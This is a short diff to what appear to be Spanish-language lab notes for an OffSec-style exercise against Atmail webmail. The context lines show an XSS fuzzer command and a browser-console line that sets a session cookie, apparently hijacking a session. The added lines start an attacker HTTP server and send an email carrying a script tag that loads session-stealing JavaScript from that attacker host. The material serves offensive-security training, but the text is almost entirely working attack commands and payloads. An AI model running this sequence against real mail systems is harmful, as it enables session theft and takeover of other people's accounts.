@@ -16,4 +16,7 @@ python xss-webmail-fuzzer.py -t admin@offsec.local -f attacker@offsec.local -s 1
 ```
 Inspeccionador -> Console
 javascript:void(document.cookie="atmail6=1fp0fjq4aa8sm5if934b62ptv6"); 
+
+python -m SimpleHTTPServer 8000
+python atmail_sendmail.py 192.168.100.34 '<script src="http://192.168.100.12:8000/atmail-session.js"></script>
 ```
